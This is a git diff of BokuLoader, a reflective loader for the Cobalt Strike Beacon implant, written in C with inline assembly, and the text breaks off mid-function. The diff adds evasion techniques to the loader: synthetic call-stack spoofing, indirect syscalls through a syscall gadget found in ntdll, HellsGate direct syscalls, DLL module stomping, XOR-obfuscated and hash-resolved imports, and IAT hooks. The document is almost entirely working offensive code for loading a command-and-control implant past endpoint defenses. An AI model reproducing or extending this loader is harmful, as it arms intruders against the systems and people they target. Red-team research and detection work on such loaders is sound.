@@ -18,282 +18,297 @@ __asm__(
 
 void * BokuLoader()
 {
-    APIS   api;
     SIZE_T size;
     void * base;
-    Dll virtual_beacon_dll, raw_beacon_dll;
+    // Dll virtual_beacon, raw_beacon;
+    // Spoof_Struct spoof_struct = { 0 }; 
 
-    unsigned char xorkey    = 0;
-    unsigned int oldprotect = 0;
-    unsigned int newprotect = 0;
+    BYTE xorkey    = 0;
+    DWORD oldprotect = 0;
+    DWORD newprotect = 0;
     void* hMapFile          = NULL;
-    RtlSecureZeroMemory(&virtual_beacon_dll,sizeof(Dll));
-    RtlSecureZeroMemory(&raw_beacon_dll,sizeof(Dll));
 
     // Get Raw beacons base address
-    raw_beacon_dll.dllBase = returnRDI();
-    parseDLL(&raw_beacon_dll);
+    void * raw_beaconBase = returnRDI();
 
-    getApis(&api);
+    HEAP_APIS heap = {0};
+    getHeapApis(&heap);
 
-    checkUseRWX(&raw_beacon_dll);
+    APIS * api                  = (Dll *)          heap.HeapAlloc(heap.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(APIS));
+    Dll * virtual_beacon        = (Dll *)          heap.HeapAlloc(heap.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Dll));
+    Dll * raw_beacon            = (Dll *)          heap.HeapAlloc(heap.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Dll));
+    Spoof_Struct * spoof_struct = (Spoof_Struct *) heap.HeapAlloc(heap.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Spoof_Struct));
+    Dll * ntdll                 = (Dll *)          heap.HeapAlloc(heap.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Dll));
 
-    virtual_beacon_dll.dllBase = NULL;
+    raw_beacon->dllBase = raw_beaconBase;
+    parse_module_headers(raw_beacon);
+
+    setup_synthetic_callstack(spoof_struct);
+
+    ntdll->dllBase = loaded_module_base_from_hash( NTDLL );
+    parse_module_headers( ntdll );
+
+    BYTE syscall_gadget_bytes[] = {0x0F,0x05,0xC3};
+    void * syscall_gadget = FindGadget((LPBYTE)ntdll->text_section, ntdll->text_section_size, syscall_gadget_bytes, sizeof(syscall_gadget_bytes));
+
+    getApis(api);
+
+    checkUseRWX(raw_beacon);
+
+    virtual_beacon->dllBase = NULL;
     // Check if DLL Module stomping option is enabled from the C2 profile via allocator code 0x4 written by UDRL Aggressor script
-    if ((*(USHORT *)((char*)raw_beacon_dll.dllBase + 0x40)) == 0x4){
-        // LoadLibraryExA(
-        //    DLL to stomp UTF8 string,
-        //    hFile = 0 ;This parameter is reserved for future use. It must be NULL.
-        //    DONT_RESOLVE_DLL_REFERENCES  (0x00000001) ; the system does not call DllMain
-        base = api.LoadLibraryExA(((char*)raw_beacon_dll.dllBase+0x44),0,1);
+    if ((*(WORD *)((BYTE*)raw_beacon->dllBase + 0x40)) == 0x4){
+        base = api->LoadLibraryExA(((BYTE*)raw_beacon->dllBase+0x44),0,1);
         // write our .text section at DLL+0x4000 (first 0x1000 is the uncopied header)
-        base = ((char*)base + 0x3000);
+        base = ((BYTE*)base + 0x3000);
         oldprotect = 0;
         if(base){
             // Add some extra size 
-            size = raw_beacon_dll.size + 0x2000;
+            size = raw_beacon->size + 0x2000;
             oldprotect = 0;
             // NtProtectVirtualMemory syscall
-            HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory), api.pNtProtectVirtualMemory);
-            ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, raw_beacon_dll.BeaconMemoryProtection, &oldprotect);
+            HellsGate(getSyscallNumber(api->pNtProtectVirtualMemory));
+            ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, raw_beacon->BeaconMemoryProtection, &oldprotect);
             // Have to zero out the memory for the DLL memory to become a private copy, else unwritten memory in beacon DLL can cause a crash.
             RtlSecureZeroMemory(base,size);
-            virtual_beacon_dll.dllBase = base;
+            virtual_beacon->dllBase = base;
         }
     }
-    else if ((*(USHORT *)((char*)raw_beacon_dll.dllBase + 0x40)) == 0x3){
-        size = ((char*)raw_beacon_dll.size + 0x10000);
-        unsigned __int64 align = 0xFFFFFFFFFFFFF000;
-        base = api.HeapAlloc(api.GetProcessHeap(),0x8,size); // 0x8 = zero out heap memory
-        base = (void*)((char*)base + 0x2000);
-        base = (void*)((unsigned __int64)base & align);
+    else if ((*(WORD *)((BYTE*)raw_beacon->dllBase + 0x40)) == 0x3){
+        size = ((BYTE*)raw_beacon->size + 0x10000);
+        ULONG_PTR align = 0xFFFFFFFFFFFFF000;
+        base = api->HeapAlloc(api->GetProcessHeap(),0x8,size); // 0x8 = zero out heap memory
+        base = (void*)((BYTE*)base + 0x2000);
+        base = (void*)((ULONG_PTR)base & align);
         if(base){
             oldprotect = 0;
-            virtual_beacon_dll.dllBase = base;
-            HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory), api.pNtProtectVirtualMemory);
-            ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, raw_beacon_dll.BeaconMemoryProtection, &oldprotect);
+            virtual_beacon->dllBase = base;
+            HellsGate(getSyscallNumber(api->pNtProtectVirtualMemory));
+            ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, raw_beacon->BeaconMemoryProtection, &oldprotect);
         }
     }
-    else if ((*(USHORT *)((char*)raw_beacon_dll.dllBase + 0x40)) == 0x2){
-        size = raw_beacon_dll.size;
-        hMapFile = api.CreateFileMappingA(NtCurrentProcess(),0,PAGE_EXECUTE_READWRITE,0,size,0);
+    else if ((*(WORD *)((BYTE*)raw_beacon->dllBase + 0x40)) == 0x2){
+        size = raw_beacon->size;
+
+        hMapFile = api->CreateFileMappingA(NtCurrentProcess(),0,PAGE_EXECUTE_READWRITE,0,size,0);
         if(hMapFile){
-            base = api.MapViewOfFile(hMapFile,0xF003F,0,0,0);
+            base = api->MapViewOfFile(hMapFile,0xF003F,0,0,0);
             if(base){
                 oldprotect = 0;
-                virtual_beacon_dll.dllBase = base;
-                HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory), api.pNtProtectVirtualMemory);
-                ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, raw_beacon_dll.BeaconMemoryProtection, &oldprotect);
+                virtual_beacon->dllBase = base;
+                spoof_struct->ssn = getSyscallNumber(api->pNtProtectVirtualMemory);
+                base = spoof_synthetic_callstack(
+                    NtCurrentProcess(),                     // Argument # 1
+                    &base,                                  // Argument # 2
+                    &size,                                  // Argument # 3
+                    raw_beacon->BeaconMemoryProtection, // Argument # 4
+                    spoof_struct,                           // Pointer to Spoof Struct 
+                    syscall_gadget,                         // Pointer to API Call
+                    (void *)1,                              // Number of Arguments on Stack (Args 5+)
+                    &oldprotect                             // Argument ++
+                ); 
+                // HellsGate(getSyscallNumber(api->pNtProtectVirtualMemory));
+                // ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, raw_beacon->BeaconMemoryProtection, &oldprotect);
             }
         }
     }
     else{
         // Allocate new memory to write our new RDLL too
         base = NULL;
-        size = raw_beacon_dll.size;
-        HellsGate(getSyscallNumber(api.pNtAllocateVirtualMemory), api.pNtAllocateVirtualMemory);
-        ((tNtAlloc)HellDescent)(NtCurrentProcess(), &base, 0, &size, MEM_RESERVE|MEM_COMMIT, raw_beacon_dll.BeaconMemoryProtection);
+        size = raw_beacon->size;
+        HellsGate(getSyscallNumber(api->pNtAllocateVirtualMemory));
+        ((tNtAlloc)HellDescent)(NtCurrentProcess(), &base, 0, &size, MEM_RESERVE|MEM_COMMIT, raw_beacon->BeaconMemoryProtection);
         RtlSecureZeroMemory(base,size); // Zero out the newly allocated memory
 
-        virtual_beacon_dll.dllBase = base;
+        virtual_beacon->dllBase = base;
     }
  
-    checkObfuscate(&raw_beacon_dll); 
+    checkObfuscate(raw_beacon); 
 
-    doSections(&virtual_beacon_dll, &raw_beacon_dll);
-    doImportTable(&api, &virtual_beacon_dll, &raw_beacon_dll);
-    doRelocations(&api, &virtual_beacon_dll, &raw_beacon_dll);
+    doSections(virtual_beacon, raw_beacon);
+    doImportTable(api, virtual_beacon, raw_beacon);
+    doRelocations(api, virtual_beacon, raw_beacon);
    
     // Get the entry point for beacon located in the .text section
-    //virtual_beacon_dll.EntryPoint = getBeaconEntryPoint(virtual_beacon_dll.dllBase, raw_beacon_dll.OptionalHeader);
-    virtual_beacon_dll.EntryPoint = checkFakeEntryAddress_returnReal(&raw_beacon_dll, &virtual_beacon_dll);
+    virtual_beacon->EntryPoint = checkFakeEntryAddress_returnReal(raw_beacon, virtual_beacon);
 
     // If beacon.text is not RWX, change memory protections of virtual beacon.text section to RX
-    if(raw_beacon_dll.BeaconMemoryProtection == PAGE_READWRITE){
+    if(raw_beacon->BeaconMemoryProtection == PAGE_READWRITE){
         oldprotect = 0;
-        base = virtual_beacon_dll.TextSection;
-        size = virtual_beacon_dll.TextSectionSize;
+        base = virtual_beacon->text_section;
+        size = virtual_beacon->text_section_size;
         newprotect = PAGE_EXECUTE_READ;
         // NtProtectVirtualMemory syscall
-        HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory), api.pNtProtectVirtualMemory);
+        HellsGate(getSyscallNumber(api->pNtProtectVirtualMemory));
         ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, newprotect, &oldprotect);
     }
 
-    // DLL_PROCESS_ATTACH 1
-    // The DLL is being loaded into the virtual address space of the current process. 
-    // DLLs can use this opportunity to initialize any instance data or to use the TlsAlloc function to allocate a thread local storage (TLS) index.
-    // https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain
+    void * EntryPoint = virtual_beacon->EntryPoint;
+    void * dllBase    = virtual_beacon->dllBase;
+
+    heap.HeapFree(heap.GetProcessHeap(), 0, api);
+    heap.HeapFree(heap.GetProcessHeap(), 0, virtual_beacon);
+    heap.HeapFree(heap.GetProcessHeap(), 0, raw_beacon);
+    heap.HeapFree(heap.GetProcessHeap(), 0, spoof_struct);
+
     // Calling the entrypoint of beacon with DLL_PROCESS_ATTACH is required for beacon not to crash. This initializes beacon. After init then beacon will return to us.
-    ((DLLMAIN)virtual_beacon_dll.EntryPoint)(virtual_beacon_dll.dllBase, DLL_PROCESS_ATTACH, NULL);
-    return virtual_beacon_dll.EntryPoint;
+    ((DLLMAIN)EntryPoint)(dllBase, DLL_PROCESS_ATTACH, NULL);
+    return EntryPoint;
 }
 
-void checkObfuscate(Dll * raw_beacon_dll_struct){
-    PIMAGE_DOS_HEADER  raw_beacon_dll_DOS_HEADER   = (PIMAGE_DOS_HEADER)raw_beacon_dll_struct->dllBase;
-    PIMAGE_FILE_HEADER raw_beacon_dll_FILE_HEADER  = (PIMAGE_FILE_HEADER)(raw_beacon_dll_DOS_HEADER->e_lfanew + (char*)raw_beacon_dll_struct->dllBase);
-
+void checkObfuscate(Dll * raw_beacon){
     // xor key at beacon.dll+0x24 (OEM Identifier)
-    unsigned char obfuscate_flag = (unsigned char)raw_beacon_dll_DOS_HEADER->e_oemid;
-    
-    if (obfuscate_flag == 0x1){
-        raw_beacon_dll_struct->xor_key = *(unsigned char*)((char*)&raw_beacon_dll_DOS_HEADER->e_oemid + 0x1);
+    if ((BYTE)raw_beacon->dos_header->e_oemid == 0x1){
+        raw_beacon->xor_key = *(BYTE*)((BYTE*)&raw_beacon->dos_header->e_oemid + 0x1);
     }else{
-        raw_beacon_dll_struct->xor_key = 0;
+        raw_beacon->xor_key = 0;
     }
 }
 
 // OptionalHeader + 0x34 = OptionalHeader.Win32VersionValue. Seems unused by CS so we will put the useRWX flag there
-void checkUseRWX(Dll * raw_beacon_dll_struct){
-    PIMAGE_DOS_HEADER  raw_beacon_dll_DOS_HEADER            = (PIMAGE_DOS_HEADER)raw_beacon_dll_struct->dllBase;
-    PIMAGE_FILE_HEADER raw_beacon_dll_FILE_HEADER           = (PIMAGE_FILE_HEADER)(raw_beacon_dll_DOS_HEADER->e_lfanew + (char*)raw_beacon_dll_struct->dllBase);
-    PIMAGE_OPTIONAL_HEADER64 raw_beacon_dll_OPTIONAL_HEADER = (PIMAGE_OPTIONAL_HEADER64)(0x18 + (char*)raw_beacon_dll_FILE_HEADER);
-    if (raw_beacon_dll_OPTIONAL_HEADER->Win32VersionValue == 0xBC){
-        raw_beacon_dll_struct->BeaconMemoryProtection = PAGE_EXECUTE_READWRITE;
+void checkUseRWX(Dll * raw_beacon){
+    if (raw_beacon->optional_header->Win32VersionValue == 0xBC){
+        raw_beacon->BeaconMemoryProtection = PAGE_EXECUTE_READWRITE;
     }else{
-        raw_beacon_dll_struct->BeaconMemoryProtection = PAGE_READWRITE;
+        raw_beacon->BeaconMemoryProtection = PAGE_READWRITE;
     }
 }
 
 // if the Malleable PE C2 profile has `set entry_point` then the OPTIONAL_HEADER->EntryPoint is a decoy and the real entry point is at OPTIONAL_HEADER->LoaderFlags
-void* checkFakeEntryAddress_returnReal(Dll * raw_beacon_dll_struct, Dll * virtual_beacon_dll_struct){
-    PIMAGE_DOS_HEADER  raw_beacon_dll_DOS_HEADER            = (PIMAGE_DOS_HEADER)raw_beacon_dll_struct->dllBase;
-    PIMAGE_FILE_HEADER raw_beacon_dll_FILE_HEADER           = (PIMAGE_FILE_HEADER)(raw_beacon_dll_DOS_HEADER->e_lfanew + (char*)raw_beacon_dll_struct->dllBase);
-    PIMAGE_OPTIONAL_HEADER64 raw_beacon_dll_OPTIONAL_HEADER = (PIMAGE_OPTIONAL_HEADER64)(0x18 + (char*)raw_beacon_dll_FILE_HEADER);
-    if (raw_beacon_dll_OPTIONAL_HEADER->LoaderFlags == 0){
-        return ((char*)virtual_beacon_dll_struct->dllBase + raw_beacon_dll_OPTIONAL_HEADER->AddressOfEntryPoint);
+void* checkFakeEntryAddress_returnReal(Dll * raw_beacon, Dll * virtual_beacon){
+    if (raw_beacon->optional_header->LoaderFlags == 0){
+        return ((BYTE*)virtual_beacon->dllBase + raw_beacon->optional_header->AddressOfEntryPoint);
     }else{
-        return ((char*)virtual_beacon_dll_struct->dllBase + raw_beacon_dll_OPTIONAL_HEADER->LoaderFlags);
+        return ((BYTE*)virtual_beacon->dllBase + raw_beacon->optional_header->LoaderFlags);
     }
 }
 
-void doSections(Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
+void doSections(Dll * virtual_beacon, Dll * raw_beacon){
     // Save .text section address and size for destination RDLL so we can make it RE later
-    int textSectionFlag = FALSE;
-    int ObfuscateFlag   = FALSE;
-    virtual_beacon_dll->TextSection = NULL;
-    virtual_beacon_dll->TextSectionSize = 0;
-    unsigned long numberOfSections = raw_beacon_dll->NumberOfSections;
-    raw_beacon_dll->NthSection     = add(raw_beacon_dll->OptionalHeader, raw_beacon_dll->SizeOfOptionalHeader);
+    DWORD text_sectionFlag = FALSE;
+    DWORD ObfuscateFlag   = FALSE;
+    virtual_beacon->text_section = NULL;
+    virtual_beacon->text_section_size = 0;
+    DWORD numberOfSections = raw_beacon->file_header->NumberOfSections;
+    BYTE * this_section   = add(raw_beacon->optional_header, raw_beacon->optional_header_size);
     Section section;
     while( numberOfSections-- )
     {
         __asm__(
-            "add rax, 0xC   \n"   // offsetof(IMAGE_SECTION_HEADER, VirtualAddress)
+            "add rax, 0xC   \n"  // offsetof(IMAGE_SECTION_HEADER, VirtualAddress)
             "xor rcx, rcx   \n"
             "mov ecx, [rax] \n"
             "xchg rax, rcx  \n"
-            : "=r" (section.RVA)               // RAX OUT
-            : "r" (raw_beacon_dll->NthSection) // RAX IN
+            : "=r" (section.RVA) // RAX OUT
+            : "r" (this_section) // RAX IN
         );
-        section.dst_rdll_VA = add(virtual_beacon_dll->dllBase, section.RVA);
+        section.dst_rdll_VA = add(virtual_beacon->dllBase, section.RVA);
         __asm__(
             "add rax, 0x14  \n"  // offsetof(IMAGE_SECTION_HEADER, PointerToRawData)
             "xor rcx, rcx   \n"
             "mov ecx, [rax] \n"
             "xchg rax, rcx  \n"
             : "=r" (section.PointerToRawData)  // RAX OUT
-            : "r" (raw_beacon_dll->NthSection) // RAX IN
+            : "r" (this_section) // RAX IN
         );
-        section.src_rdll_VA = add(raw_beacon_dll->dllBase, section.PointerToRawData);
+        section.src_rdll_VA = add(raw_beacon->dllBase, section.PointerToRawData);
         __asm__(
             "add rax, 0x10  \n"  // offsetof(IMAGE_SECTION_HEADER, SizeOfRawData)
             "xor rcx, rcx   \n"
             "mov ecx, [rax] \n"
             "xchg rax, rcx  \n"
             : "=r" (section.SizeOfSection)     // RAX OUT
-            : "r" (raw_beacon_dll->NthSection) // RAX IN
+            : "r" (this_section) // RAX IN
         );
         // check if this is the .text section
-        if (textSectionFlag == FALSE)
+        if (text_sectionFlag == FALSE)
         {
             // Save the .text section address & size for later so we can change it from RW to RE. This has to be done after we do relocations
-            virtual_beacon_dll->TextSection     = section.dst_rdll_VA;
-            virtual_beacon_dll->TextSectionSize = section.SizeOfSection;
-            textSectionFlag = TRUE;
+            virtual_beacon->text_section     = section.dst_rdll_VA;
+            virtual_beacon->text_section_size = section.SizeOfSection;
+            text_sectionFlag = TRUE;
         }
         // Copy the section from the source address to the destination for the size of the section
-        Memcpy(section.dst_rdll_VA, section.src_rdll_VA, section.SizeOfSection);
+        memory_copy(section.dst_rdll_VA, section.src_rdll_VA, section.SizeOfSection);
         // Get the address of the next section header and loop until there are no more sections
-        raw_beacon_dll->NthSection += 0x28; // sizeof( IMAGE_SECTION_HEADER ) = 0x28
+        this_section += 0x28; // sizeof( IMAGE_SECTION_HEADER ) = 0x28
     }
 }
 
-void doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
+void doImportTable(APIS * api, Dll * virtual_beacon, Dll * raw_beacon){
     void *ImportDirectory, *importEntryHint, *BaseOrdinal, *TableIndex, *nImportDesc;
     void *EntryAddress, *importNameRVA, *LookupTableEntry, *AddressTableEntry, *EntryName, *nullCheck;
-    unsigned __int64 len_importName, len_EntryName;
-    PIMAGE_DOS_HEADER        raw_beacon_dll_DOS_HEADER      = NULL;
-    PIMAGE_FILE_HEADER       raw_beacon_dll_FILE_HEADER     = NULL;
-    PIMAGE_OPTIONAL_HEADER64 raw_beacon_dll_OPTIONAL_HEADER = NULL;
-    PIMAGE_DATA_DIRECTORY    raw_beacon_dll_data_directory  = NULL;
-    char * importName = NULL;
+    ULONG_PTR len_importName = 0;
+    ULONG_PTR len_EntryName  = 0;
+    PIMAGE_DOS_HEADER        raw_beacon_DOS_HEADER      = NULL;
+    PIMAGE_FILE_HEADER       raw_beacon_FILE_HEADER     = NULL;
+    PIMAGE_OPTIONAL_HEADER64 raw_beacon_OPTIONAL_HEADER = NULL;
+    PIMAGE_DATA_DIRECTORY    raw_beacon_data_directory  = NULL;
+    BYTE * importName = NULL;
     void* slphook     = NULL;
-    DWORD    ImportDirectory_RVA       = 0;
-    DWORD    ImportDirectory_Size      = 0;
-    Dll dll_import;
+    DWORD    ImportDirectory_RVA  = 0;
+    DWORD    ImportDirectory_Size = 0;
+    Dll dll_import = {0};
     
-    // This is IAT hooking functionality support added to this public project
-    // Currently this is just a poc stub. As it exists atm, this is an unsupported non-default feature 
-    // Currently only demo sleep hook exists which uses NtDelayExecution direct syscall rather than k32.Sleep->kb.SleepEx->nt.NtDelayExecution
     // To enable IAT Hooking change this value to the number of hooks
     // Making this value larger than defined hooks will still work, but it will slow down IAT resolution
     // Enabling the sleephook should have sleepmask set to "false" in C2 profile
-    unsigned int hooks = 0;
-    //unsigned int hooks = 1;
+    //DWORD hooks = 0;
+    DWORD hooks = 13;
      
     // Get the Image base by walking the headers
-    raw_beacon_dll_DOS_HEADER       = (PIMAGE_DOS_HEADER)raw_beacon_dll->dllBase;
-    raw_beacon_dll_FILE_HEADER      = (PIMAGE_FILE_HEADER)(raw_beacon_dll_DOS_HEADER->e_lfanew + (char*)raw_beacon_dll_DOS_HEADER);
-    raw_beacon_dll_OPTIONAL_HEADER  = (PIMAGE_OPTIONAL_HEADER64)(0x18 + (char*)raw_beacon_dll_FILE_HEADER);
+    raw_beacon_DOS_HEADER       = (PIMAGE_DOS_HEADER)raw_beacon->dllBase;
+    raw_beacon_FILE_HEADER      = (PIMAGE_FILE_HEADER)(raw_beacon_DOS_HEADER->e_lfanew + (BYTE*)raw_beacon_DOS_HEADER);
+    raw_beacon_OPTIONAL_HEADER  = (PIMAGE_OPTIONAL_HEADER64)(0x18 + (BYTE*)raw_beacon_FILE_HEADER);
 
     // Get the raw file offset to the Data Directory located in the Optional Header
-    raw_beacon_dll_data_directory   = (PIMAGE_DATA_DIRECTORY)raw_beacon_dll_OPTIONAL_HEADER->DataDirectory;
+    raw_beacon_data_directory   = (PIMAGE_DATA_DIRECTORY)raw_beacon_OPTIONAL_HEADER->DataDirectory;
 
-    ImportDirectory_RVA   = raw_beacon_dll_data_directory[1].VirtualAddress;
-    ImportDirectory_Size  = raw_beacon_dll_data_directory[1].Size;
-    ImportDirectory       = ((char*)virtual_beacon_dll->dllBase + ImportDirectory_RVA);
+    ImportDirectory_RVA   = raw_beacon_data_directory[1].VirtualAddress;
+    ImportDirectory_Size  = raw_beacon_data_directory[1].Size;
+    ImportDirectory       = ((BYTE*)virtual_beacon->dllBase + ImportDirectory_RVA);
 
     nImportDesc = ImportDirectory;
     
     __asm__(
         "xor rcx, rcx   \n"
         "add rdx, 0xC   \n"  // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
-        "mov ecx, [rdx] \n"  // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->Name into Ecx
+        "mov ecx, [rdx] \n"  // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name into Ecx
         "mov rdx, rcx   \n"
-        "add rax, rdx   \n"       // Address of Module String = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
-        : "=r" (importNameRVA),   // RDX OUT
-          "=r" (importName)       // RAX OUT
-        : "r" (virtual_beacon_dll->dllBase), // RAX IN
-          "r" (nImportDesc)       // RDX IN
+        "add rax, rdx   \n"              // Address of Module String = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
+        : "=r" (importNameRVA),          // RDX OUT
+          "=r" (importName)              // RAX OUT
+        : "r" (virtual_beacon->dllBase), // RAX IN
+          "r" (nImportDesc)              // RDX IN
     );
     // The last entry in the image import directory is all zeros
     while(importNameRVA)
     {
         RtlSecureZeroMemory(&dll_import,sizeof(Dll));
-        len_importName  = (unsigned __int64)StringLengthA(importName);
-        if(raw_beacon_dll->xor_key){
-            xorc(len_importName, importName, raw_beacon_dll->xor_key);
+        len_importName  = (ULONG_PTR)StringLengthA(importName);
+        if(raw_beacon->xor_key){
+            xorc(len_importName, importName, raw_beacon->xor_key);
         }
         dll_import.dllBase   = xLoadLibrary(importName); 
         stomp(len_importName, importName); // 0 out import DLL name in virtual beacon dll
         __asm__(
             "xor rcx, rcx   \n"   // importLookupTableEntry = VA of the OriginalFirstThunk
-            "mov ecx, [rax] \n"   // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->OriginalFirstThunk into Ecx
+            "mov ecx, [rax] \n"   // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->OriginalFirstThunk into Ecx
             "add rcx, rdx   \n"   // importLookupTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->OriginalFirstThunk
             "xchg rax, rcx  \n"
-            : "=r" (LookupTableEntry) // RAX OUT
-            : "r" (nImportDesc),      // RAX IN        
-              "r" (virtual_beacon_dll->dllBase)  // RDX IN
+            : "=r" (LookupTableEntry)        // RAX OUT
+            : "r" (nImportDesc),             // RAX IN        
+              "r" (virtual_beacon->dllBase)  // RDX IN
         );
         __asm__(
             "xor rcx, rcx   \n"   // importAddressTableEntry = VA of the IAT (via first thunk not origionalfirstthunk)
-            "add rax, 0x10  \n"   // 16 (0x10) byte offset is the address of the unsigned long FirstThunk within the image import descriptor
-            "mov ecx, [rax] \n"   // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->FirstThunk into Ecx
+            "add rax, 0x10  \n"   // 16 (0x10) byte offset is the address of the DWORD FirstThunk within the image import descriptor
+            "mov ecx, [rax] \n"   // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->FirstThunk into Ecx
             "add rcx, rdx   \n"   // importAddressTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->FirstThunk
             "xchg rax, rcx  \n"
-            : "=r" (AddressTableEntry) // RAX OUT
-            : "r" (nImportDesc),       // RAX IN
-              "r" (virtual_beacon_dll->dllBase)   // RDX IN
+            : "=r" (AddressTableEntry)        // RAX OUT
+            : "r" (nImportDesc),              // RAX IN
+              "r" (virtual_beacon->dllBase)   // RDX IN
         );
         __asm__(
             "mov rax, [rax] \n"
@@ -302,15 +317,15 @@ void doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
         );
         while(nullCheck)
         {
-            parseDLL(&dll_import);
+            parse_module_headers(&dll_import);
             EntryAddress = NULL;
 
             if( LookupTableEntry && ((PIMAGE_THUNK_DATA)LookupTableEntry)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
             {
                 __asm__( // Export Base Ordinal from the Export Directory of the module/dll being imported (0x10 offset)
                     "xor rdx, rdx   \n" // located in the Export Directory in memory of the module which functions/api's are being imported
-                    "add rax, 0x10  \n" // unsigned long Base; // 0x10 offset // RCX = &importedDllBaseOrdinal
-                    "mov edx, [rax] \n" // RAX = importedDllBaseOrdinal (Value/unsigned long)
+                    "add rax, 0x10  \n" // DWORD Base; // 0x10 offset // RCX = &importedDllBaseOrdinal
+                    "mov edx, [rax] \n" // RAX = importedDllBaseOrdinal (Value/DWORD)
                     "xchg rax, rdx  \n"
                     : "=r" (BaseOrdinal)                // RAX OUT
                     : "r" (dll_import.Export.Directory) // RAX IN
@@ -327,11 +342,11 @@ void doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
                     : "r" (importEntryHint), // RAX IN
                       "r" (BaseOrdinal)      // RDX IN
                 );
-                __asm__( // The ExportAddressTable/AddressOfFunctions holds unsigned long (4 byte) RVA's for the executable functions/api's address
+                __asm__( // The ExportAddressTable/AddressOfFunctions holds DWORD (4 byte) RVA's for the executable functions/api's address
                     "mov r11, rdx    \n"
                     "xor r9, r9      \n"
-                    "add r9b, 0x4    \n" // sizeof(unsigned long) - This is because each entry in the table is a 4 byte unsigned long which is the RVA/offset for the actual executable functions address
-                    "mul r9          \n" // importEntryExportTableIndex * sizeof(unsigned long)
+                    "add r9b, 0x4    \n" // sizeof(DWORD) - This is because each entry in the table is a 4 byte DWORD which is the RVA/offset for the actual executable functions address
+                    "mul r9          \n" // importEntryExportTableIndex * sizeof(DWORD)
                     "add rax, r11    \n" // RVA for our functions address
                     "xor r10, r10    \n"
                     "mov r10d, [rax] \n" // The RVA for the executable function we are importing
@@ -358,21 +373,21 @@ void doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
                     "add rax, 0x2   \n" // The hint is the first 2 bytes, then its followed by the name string for our import. We need to drop the first 2 bytes so we just have the name string
                     : "=r" (EntryName)         // RAX OUT
                     : "r" (AddressTableEntry), // RAX IN, import table entry we are going to overwrite / The RVA for our functions Name/Hint Table entry
-                      "r" (virtual_beacon_dll->dllBase)   // RDX IN
+                      "r" (virtual_beacon->dllBase)   // RDX IN
                 );
                 // patch in the address for this imported function
-                len_EntryName = (unsigned __int64)StringLengthA(EntryName);
-                if(raw_beacon_dll->xor_key){
-                    xorc(len_EntryName, EntryName, raw_beacon_dll->xor_key);
+                len_EntryName = (ULONG_PTR)StringLengthA(EntryName);
+                if(raw_beacon->xor_key){
+                    xorc(len_EntryName, EntryName, raw_beacon->xor_key);
                 }
                 if (hooks){
-                    EntryAddress = check_and_write_IAT_Hook(EntryName, virtual_beacon_dll, raw_beacon_dll);
+                    EntryAddress = check_and_write_IAT_Hook(hash_ascii_string(EntryName), virtual_beacon, raw_beacon);
                 }
                 if (EntryAddress){
                     hooks--;
                 }
                 if (EntryAddress == NULL){
-                    EntryAddress = xGetProcAddress(EntryName, &dll_import);
+                    EntryAddress = xGetProcAddress_hash(hash_ascii_string(EntryName), &dll_import);
                 }
                 stomp(len_EntryName, EntryName); // 0 out import entry name in virtual beacon dll
                 __asm__(
@@ -395,36 +410,57 @@ void doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
         __asm__( // Do this again for the next module/DLL in the Import Directory
             "xor rcx, rcx   \n"
             "add rax, 0xC   \n"  // 12(0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
-            "mov ecx, [rax] \n"  // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->Name
+            "mov ecx, [rax] \n"  // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name
             "mov rax, rcx   \n"  // RVA of Name DLL
             "add rdx, rax   \n"  // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
             : "=r" (importName),     // RDX OUT
               "=r" (importNameRVA)   // RAX OUT
             : "r" (nImportDesc),     // RAX IN
-              "r" (virtual_beacon_dll->dllBase) // RDX IN
+              "r" (virtual_beacon->dllBase) // RDX IN
         );
     }
 }
 
-void* check_and_write_IAT_Hook(char* EntryName, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
-    // Hook Kernel32.Sleep
+void* check_and_write_IAT_Hook(DWORD api_hash, Dll * virtual_beacon, Dll * raw_beacon)
+{
     // Enabling the sleephook should have sleepmask set to "false" in C2 profile
-    unsigned char str_Sleep[] = {0x73,0x8c,0x85,0x85,0x90,0x00};
